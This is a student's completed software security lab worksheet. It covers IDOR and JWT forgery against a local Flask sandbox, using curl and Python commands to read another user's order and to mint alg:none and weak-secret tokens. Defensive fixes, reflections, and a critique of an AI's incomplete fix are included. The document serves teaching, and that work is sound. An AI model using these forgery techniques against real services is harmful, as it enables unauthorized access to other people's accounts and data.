# Worksheet 6 — Authentication, Sessions & Access Control (3 hrs)

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.

## Part 1 — Student Information

| Name | Student ID | Date | Group |
|Neree Booncharoen|6631503018|10/9/2026|1|
|      |           |      |       |

![Diagram of one request passing two gates: Gate 1 authentication accepts an alg:none forgery, a weak-secret forgery, and alice's real token, then Gate 2 authorization fails to check ownership so alice's valid token reads bob's /api/orders/2 as IDOR, with the solution_app.py fixes for both.](img/authn-vs-authz.svg)

## Part 2 — Lecture Questions

Answer in 2–4 sentences each.

1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result (L63) — which of the two is missing?
Answer:Authentication verifies who the user is, while authorization determines what the authenticated user is allowed to access. In vulnerable_app.py, get_order calls current_user() but ignores the result, so the missing protection is authorization.
2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what single check in `solution_app.py` (L64) closes it?
Answer:IDOR (Insecure Direct Object Reference) occurs when an application lets a user access an object by changing its identifier without checking ownership. /api/orders/<oid> is exploitable because an attacker can change oid and access another user's order. The check in solution_app.py verifies that the order belongs to the current user, such as order["user_id"] != user["id"], and rejects unauthorized access.
3. Explain the **`alg:none`** JWT attack. Why does listing `"none"` in `algorithms=[...]` (L55) let an attacker submit an *unsigned* token?
Answer:The alg:none attack abuses JWTs that are accepted with the "none" algorithm, meaning the token has no cryptographic signature. If "none" is included in algorithms=[...], the server accepts an unsigned token as valid, allowing an attacker to modify claims such as the user identity without knowing the secret.
4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?
Answer:The hardcoded secret "secret" is dangerous because an attacker who discovers it can create and sign their own valid HMAC-signed JWTs. Even if alg:none is disabled, the attacker could forge tokens because they know the signing key. A strong random secret combined with a pinned algorithm prevents attackers from feasibly creating valid forged tokens.
5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?
Answer:The exp claim specifies when a JWT expires, preventing an old stolen token from being used indefinitely. The aud claim identifies the intended audience of the token, helping prevent a token issued for one service or purpose from being accepted by another. The secure version requires these claims so tokens are both time-limited and intended for the correct application/service.

## Part 3 — Hands-on Lab (150 min)

**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.

**Prerequisites:** Docker + Docker Compose, `curl`, `python3` with `pyjwt`, optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.

### Environment setup

```bash
cd labs/week06-authn-authz
docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
# vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
```
Optional secondary target / proxy:
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
# Burp Suite: put the proxy listener AND the browser proxy on 127.0.0.1:8081.
# NOT 8080 — the lab app already owns host 8080 (docker-compose.yml, "8080:5000").
# Burp's own default listener is 8080, so you must change it: leave it there and
# either the listener refuses to start ("Address already in use") or, if it does
# bind, the browser's proxy address is the target's address and every request
# goes straight to the app instead of through Burp — you intercept nothing.
```

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

**Task 0 — Onboarding (5 min).** Get alice's token (from `attack.md`):
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*

Answer:![alt text](image-1.png),![alt text](image.png)

**Task 1 — IDOR Treasure Hunt (30 min) 🗺️.**
- *Goal:* read **bob's** order with **alice's** token.
- *Steps:*
  ```bash
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
  ```
- *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.
Answer:![alt text](image-2.png)

```sim
jwt-forge
```

**Task 2 — JWT Forgery via alg:none (30 min) 🔏.**
- *Goal:* impersonate bob with an **unsigned** token (no secret needed).
- *Steps:*
  ```bash
  FORGED=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).
Answer:![alt text](image-3.png) The alg:none flaw allows an attacker to create an unsigned JWT containing {"sub":"bob"} without knowing the signing secret. Because the vulnerable application accepts the none algorithm, it treats the forged token as valid and allows access to Bob's order. This is a JWT signature validation flaw (CWE-347).
 

**Task 3 — JWT Forgery via weak secret (30 min) 🔏.**
- *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
- *Steps:*
  ```bash
  FORGED2=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  ```
- *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.
Answer:![alt text](image-4.png) The hardcoded HMAC secret "secret" is weak and easy to guess, allowing an attacker to create a valid HS256 JWT for Bob without knowing his password. A strong random secret and proper key management make the signing key difficult to guess and prevent attackers from forging valid tokens.

**Task 4 — Privilege/identity escalation reasoning (25 min).**
- *Goal:* combine the flaws. Using Task 2/3 you became `bob` *without his password*; using Task 1 you read objects you don't own.
- *Steps:* document the full attack chain (forge token → access any `oid`). Optionally replay the requests through **Burp Suite Repeater** and screenshot the intercepted request/response.
- *Deliverable:* a short chain diagram/paragraph + Burp (or curl) evidence.
answer:Attack chain: The attacker first forges a JWT with sub: bob using either the alg:none vulnerability or the weak HMAC secret. This allows the attacker to impersonate Bob without knowing his password. The attacker can then change the oid in /api/orders/<oid> to access orders that belong to other users because the application does not perform an ownership check.
Weak JWT validation
       ↓
Forge Bob's JWT
       ↓
Impersonate Bob
       ↓
Send Bearer token
       ↓
Change oid
       ↓
Missing ownership check
       ↓
Access unauthorized order

**Task 5 — Defend / fix it (30 min) 🛡️.**
- *Goal:* prove `solution_app.py` blocks Tasks 1–3.
- *Steps:* stop the vulnerable container (`Ctrl-C`), then:
  ```bash
  docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"
  ```
  Re-run: get a fresh alice token, then re-fire each attack. Expected: `/api/orders/2` with alice's token → **403 forbidden** (ownership check, L64); the `alg:none` token → **401 invalid token** (algorithm pinned to HS256, L50); the `"secret"` token → **401** (strong random secret + required `aud`/`exp`, L10/40).
- *Deliverable:* screenshots of the 403 and both 401s + name the fix line for each.
Answer:![alt text](image-5.png)

## Part 4 — Reflection

1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.
Answer:IDOR (Insecure Direct Object Reference) maps to CWE-639 and OWASP A01: Broken Access Control because the application fails to verify whether the authenticated user owns or is allowed to access the requested object. The JWT forgery vulnerabilities map to CWE-347 (Improper Verification of Cryptographic Signature) and CWE-321 (Use of Hard-coded Cryptographic Key), corresponding to OWASP A07: Identification and Authentication Failures.
2. **Real breach:** the **2022 Optus breach** exposed millions of customer records via an exposed/poorly-authorized API endpoint where identifiers could be enumerated — a textbook broken-access-control / IDOR-style failure. In 3–4 sentences connect it to Tasks 1 and 4 of this lab. *(Alternative: the Peloton API IDOR disclosure.)*
Answer:The 2022 Optus breach exposed millions of customer records through an exposed API endpoint where customer identifiers could be enumerated without sufficient authorization checks. This is similar to Task 1, where changing the order ID allowed Alice to access Bob's order because ownership was not properly verified. It also relates to Task 4, because the lab demonstrates how weak authentication or forged JWTs can allow an attacker to impersonate another user. Together, these show that authentication alone is not enough; every API request must enforce server-side authorization.
3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?
Answer:Deny-by-default server-side ownership checks protect the most attack surface because they directly control access to every protected object, even if an attacker obtains or forges a valid-looking token. Pinning the JWT algorithm and using a strong managed secret are also important for preventing token forgery, but they cannot replace authorization checks. Server-side authorization is non-negotiable because the client and token must never be trusted to decide what resources a user is allowed to access.

## Grading rubric (100)

| Criterion | Points |
|-----------|-------:|
| Part 2 — Lecture questions (conceptual accuracy) | 20 |
| Part 3 — Exploitation + evidence (payloads/tokens + screenshots, Tasks 1–4) | 40 |
| Part 3 — Defense (Task 5: fixes proven, lines cited) | 25 |
| Part 4 — Reflection (CWE/OWASP mapping, breach, mitigation) | 15 |
| **Total** | **100** |

---

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** ____________________
  *Flags are unique per student — submitting another student's flag is a violation. How to submit: **learn.zcr.ai/submit** (full guide: `SUBMISSION.md` in the repo root).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
  1. What did you do, and **why did the vulnerability work**?
  Answer:I used Alice's valid token to request Bob's order by changing the order ID from 1 to 2. The attack worked because the application authenticated Alice but did not check whether Alice was authorized to access order 2.
  2. **Why does your fix actually stop it** — and what could still break it?
  Answer:
---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.
Answer:“To fix the IDOR vulnerability, make sure the user is authenticated before accessing an order. You can fix /api/orders/<oid> by calling current_user() and returning 401 Unauthorized if the user is not logged in:

@app.get("/api/orders/<int:oid>")
def get_order(oid):
    user = current_user()
    if not user:
        return {"error": "unauthorized"}, 401
    return jsonify(ORDERS[oid])

This prevents attackers from accessing orders because only authenticated users can access the endpoint.”
2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).
Answer:The key problem is this line:

return jsonify(ORDERS[oid])

The AI only checks authentication, not authorization. An authenticated Alice can still change /api/orders/1 to /api/orders/2 and receive Bob's order. Therefore, the response incorrectly claims that authentication alone prevents IDOR.

This is exactly the distinction tested in the lab: authentication proves who the user is; authorization checks whether that user is allowed to access the specific object.
3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.
Answer:A correct fix must check ownership before returning the order:

@app.get("/api/orders/<int:oid>")
def get_order(oid):
    user = current_user()
    if not user:
        return {"error": "unauthorized"}, 401

    order = ORDERS.get(oid)
    if not order:
        return {"error": "not found"}, 404

    if order["owner"] != user["sub"]:
        return {"error": "forbidden"}, 403

    return jsonify(order)
> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.

---

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.
Answer:The endpoint takes an order ID from the URL and returns that order to the logged-in user. It is exploitable because the vulnerable code checks who the user is but does not check whether that user actually owns the requested order, so Alice can change the ID and access Bob’s order.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.
Answer:Final prompt

Fix the IDOR vulnerability in /api/orders/<oid> in vulnerable_app.py. Keep authentication, but add a server-side authorization check that verifies the authenticated user's identity matches the order's owner before returning the order. Return HTTP 401 if the user is not authenticated, HTTP 404 if the order does not exist, and HTTP 403 if the authenticated user does not own the order. Do not trust the oid supplied by the client or any client-controlled ownership value. Keep the existing API behavior unchanged for authorized users. After making the fix, verify it by using Alice's valid token to request /api/orders/1 and /api/orders/2; order 1 should still succeed, while Alice requesting Bob's order 2 must return HTTP 403.
*Graded on the prompt's precision and your verification — this trains problem decomposition and AI literacy (Denny et al. 2024).*
